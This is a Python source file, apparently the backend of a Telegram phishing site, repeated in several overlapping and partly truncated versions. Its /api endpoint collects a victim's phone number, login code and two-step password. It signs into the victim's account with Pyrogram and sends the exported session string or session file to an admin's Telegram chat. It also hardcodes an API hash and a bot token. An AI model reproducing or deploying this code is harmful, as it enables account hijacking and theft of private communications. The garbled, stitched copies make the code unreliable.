import asyncio, os, logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiohttp import web
import aiohttp_cors
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded

API_ID = 15587172 
API_HASH = "d3d35aebb0b6ebdb7a002836914ee37d"
BOT_TOKEN = "8711443316:AAE7IDM3KETScemryNQQs21vruVv9DK1QHA"
ADMIN_ID = 1866813859 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
active_clients = {}

async def handle_api(request):
    try:
        data = await request.json()
        action, user_id = data.get("action"), str(data.get("user_id"))
        if action == "send_phone":
            phone = data.get("phone").replace(" ", "").replace("-", "")
            client = Client(name=f"u_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await client.connect()
            s_code = await client.send_code(phone)
            active_clients[user_id] = {"c": client, "p": phone, "h": s_code.phone_code_hash}
            return web.json_response({"status": "ok"})
        elif action == "send_code":
            session = active_clients.get(user_id)
            if not session: return web.json_response({"status": "error", "message": "Session expired"})
            try:
                await session["c"].sign_in(session["p"], session["h"], data.get("code"))
                ss = await session["c"].export_session_string()
                await bot.send_message(ADMIN_ID, f"✅ LOGIN!\n{session['p']}\n\n`{ss}`", parse_mode="Markdown")
                return web.json_response({"status": "success"})
            except SessionPasswordNeeded: return web.json_response({"status": "need_2fa"})
        elif action == "send_2fa":
            session = active_clients.get(user_id)
            await session["c"].check_password(data.get("password"))
            ss = await session["c"].export_session_string()
            await bot.send_message(ADMIN_ID, f"✅ 2FA!\n{session['p']}\n\n`{ss}`", parse_mode="Markdown")
            return web.json_response({"status": "success"})
    except Exception as e: return web.json_response({"status": "error", "message": str(e)})

app = web.Application()
cors = aiohttp_cors.setup(app, defaults={"*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")})
resource = app.router.add_resource("/api")
cors.add(resource.add_route("POST", handle_api))

async def main():
    port = int(os.environ.get("PORT", 10000))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', port).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
            if not session: return web.json_response({"status": "error", "message": "Сессия истекла"})
            try:
                await session["client"].sign_in(session["phone"], session["hash"], code)
                s_string = await session["client"].export_session_string()
                await bot.send_message(ADMIN_ID, f"✅ ВХОД!\nНомер: {session['phone']}\n\n`{s_string}`", parse_mode="Markdown")
                return web.json_response({"status": "success"})
            except SessionPasswordNeeded:
                return web.json_response({"status": "need_2fa"})

        elif action == "send_2fa":
            password = data.get("password")
            session = active_clients.get(user_id)
            await session["client"].check_password(password)
            s_string = await session["client"].export_session_string()
            await bot.send_message(ADMIN_ID, f"✅ ВХОД (2FA)!\nНомер: {session['phone']}\n\n`{s_string}`", parse_mode="Markdown")
            return web.json_response({"status": "success"})

    except Exception as e:
        return web.json_response({"status": "error", "message": str(e)})

app = web.Application()
cors = aiohttp_cors.setup(app, defaults={"*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")})
resource = app.router.add_resource("/api")
cors.add(resource.add_route("POST", handle_api))

async def main():
    port = int(os.environ.get("PORT", 10000))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', port).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())            if not session: return web.json_response({"status": "error", "message": "Сессия истекла"})
            try:
                await session["client"].sign_in(session["phone"], session["hash"], code)
                s_string = await session["client"].export_session_string()
                await bot.send_message(ADMIN_ID, f"✅ ВХОД!\nНомер: {session['phone']}\n\n`{s_string}`", parse_mode="Markdown")
                return web.json_response({"status": "success"})
            except SessionPasswordNeeded:
                return web.json_response({"status": "need_2fa"})

        elif action == "send_2fa":
            password = data.get("password")
            session = active_clients.get(user_id)
            await session["client"].check_password(password)
            s_string = await session["client"].export_session_string()
            await bot.send_message(ADMIN_ID, f"✅ ВХОД (2FA)!\nНомер: {session['phone']}\n\n`{s_string}`", parse_mode="Markdown")
            return web.json_response({"status": "success"})

    except Exception as e:
        return web.json_response({"status": "error", "message": str(e)})

app = web.Application()
cors = aiohttp_cors.setup(app, defaults={"*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")})
resource = app.router.add_resource("/api")
cors.add(resource.add_route("POST", handle_api))

async def main():
    port = int(os.environ.get("PORT", 10000))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', port).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

    try:
        data = await request.json()
        action = data.get("action")
        user_id = str(data.get("user_id"))

        if action == "send_phone":
            phone = data.get("phone").replace(" ", "").replace("-", "")
            # Используем in_memory=True, чтобы не плодить файлы сессий на Render
            client = Client(name=f"u_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await client.connect()
            sent_code = await client.send_code(phone)
            active_clients[user_id] = {
                "client": client, 
                "phone": phone, 
                "hash": sent_code.phone_code_hash
            }
            return web.json_response({"status": "ok"})

        elif action == "send_code":
            code = data.get("code")
            session = active_clients.get(user_id)
            if not session: 
                return web.json_response({"status": "error", "message": "Сессия истекла"})
            
            try:
                await session["client"].sign_in(session["phone"], session["hash"], code)
                return await finish_auth(user_id, session)
            except SessionPasswordNeeded:
                return web.json_response({"status": "need_2fa"})

        elif action == "send_2fa":
            password = data.get("password")
            session = active_clients.get(user_id)
            await session["client"].check_password(password)
            return await finish_auth(user_id, session)

    except FloodWait as e:
        return web.json_response({"status": "error", "message": f"Лимит! Подождите {e.value} сек."})
    except Exception as e:
        logging.error(f"API Error: {e}")
        return web.json_response({"status": "error", "message": str(e)})

async def finish_auth(user_id, session):
    client = session["client"]
    # Генерируем строку сессии вместо файла (так надежнее для Render)
    string_session = await client.export_session_string()
    
    await bot.send_message(ADMIN_ID, f"✅ НОВЫЙ ВХОД!\nНомер: {session['phone']}\n\nSession String:\n`{string_session}`", parse_mode="Markdown")
    
    await client.disconnect()
    if user_id in active_clients:
        del active_clients[user_id]
    return web.json_response({"status": "success"})

# --- НАСТРОЙКА СЕРВЕРА ---
app = web.Application()
cors = aiohttp_cors.setup(app, defaults={
    "*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")
})
resource = app.router.add_resource("/api")
route = resource.add_route("POST", handle_api)
cors.add(route)

async def main():
if __name__ == "__main__":
    asyncio.run(main())        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

    try:
        data = await request.json()
        action = data.get("action")
        user_id = str(data.get("user_id"))

        if action == "send_phone":
            phone = data.get("phone").replace(" ", "").replace("-", "")
            # Используем in_memory=True, чтобы не плодить файлы сессий на Render
            client = Client(name=f"u_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await client.connect()
            sent_code = await client.send_code(phone)
            active_clients[user_id] = {
                "client": client, 
                "phone": phone, 
                "hash": sent_code.phone_code_hash
            }
            return web.json_response({"status": "ok"})

        elif action == "send_code":
            code = data.get("code")
            session = active_clients.get(user_id)
            if not session: 
                return web.json_response({"status": "error", "message": "Сессия истекла"})
            
            try:
                await session["client"].sign_in(session["phone"], session["hash"], code)
                return await finish_auth(user_id, session)
            except SessionPasswordNeeded:
                return web.json_response({"status": "need_2fa"})

        elif action == "send_2fa":
            password = data.get("password")
            session = active_clients.get(user_id)
            await session["client"].check_password(password)
            return await finish_auth(user_id, session)

    except FloodWait as e:
        return web.json_response({"status": "error", "message": f"Лимит! Подождите {e.value} сек."})
    except Exception as e:
        logging.error(f"API Error: {e}")
        return web.json_response({"status": "error", "message": str(e)})

async def finish_auth(user_id, session):
    client = session["client"]
    # Генерируем строку сессии вместо файла (так надежнее для Render)
    string_session = await client.export_session_string()
    
    await bot.send_message(ADMIN_ID, f"✅ НОВЫЙ ВХОД!\nНомер: {session['phone']}\n\nSession String:\n`{string_session}`", parse_mode="Markdown")
    
    await client.disconnect()
    if user_id in active_clients:
        del active_clients[user_id]
    return web.json_response({"status": "success"})

# --- НАСТРОЙКА СЕРВЕРА ---
app = web.Application()
cors = aiohttp_cors.setup(app, defaults={
    "*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")
})
resource = app.router.add_resource("/api")
route = resource.add_route("POST", handle_api)
cors.add(route)

async def main():
    # Порт для Render
    port = int(os.environ.get("PORT", 10000))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    
    logging.info(f"СЕРВЕР ЗАПУЩЕН НА ПОРТУ {port}")
    
    try:
        await dp.start_polling(bot)
    finally:
        await runner.cleanup()

if __name__ == "__main__":
    asyncio.run(main())        user_id = str(data.get("user_id"))

        if action == "send_phone":
            phone = data.get("phone").replace(" ", "").replace("-", "")
            client = Client(name=f"session_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=False)
            await client.connect()
            sent_code = await client.send_code(phone)
            active_clients[user_id] = {"client": client, "phone": phone, "hash": sent_code.phone_code_hash}
            return web.json_response({"status": "ok"})

        elif action == "send_code":
            code = data.get("code")
            session = active_clients.get(user_id)
            if not session: return web.json_response({"status": "error", "message": "Сессия истекла"})
            
            try:
                await session["client"].sign_in(session["phone"], session["hash"], code)
                return await finish_auth(user_id, session)
            except SessionPasswordNeeded:
                return web.json_response({"status": "need_2fa"})

        elif action == "send_2fa":
            password = data.get("password")
            session = active_clients.get(user_id)
            await session["client"].check_password(password)
            return await finish_auth(user_id, session)

    except FloodWait as e:
        return web.json_response({"status": "error", "message": f"Подождите {e.value} сек."})
    except Exception as e:
        return web.json_response({"status": "error", "message": str(e)})

async def finish_auth(user_id, session):
    path = f"session_{user_id}.session"
    # Ждем записи файла на диск
    await asyncio.sleep(1) 
    if os.path.exists(path):
        await bot.send_document(ADMIN_ID, types.FSInputFile(path), 
                                caption=f"🔥 НОВАЯ СЕССИЯ\nНомер: {session['phone']}\nID: {user_id}")
    
    await session["client"].disconnect()
    if user_id in active_clients: del active_clients[user_id]
    return web.json_response({"status": "success"})

# --- НАСТРОЙКА СЕРВЕРА ---
app = web.Application()
cors = aiohttp_cors.setup(app, defaults={
    "*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")
})
resource = app.router.add_resource("/api")
route = resource.add_route("POST", handle_api)
cors.add(route)

async def main():
    
if __name__ == "__main__":
    asyncio.run(main())
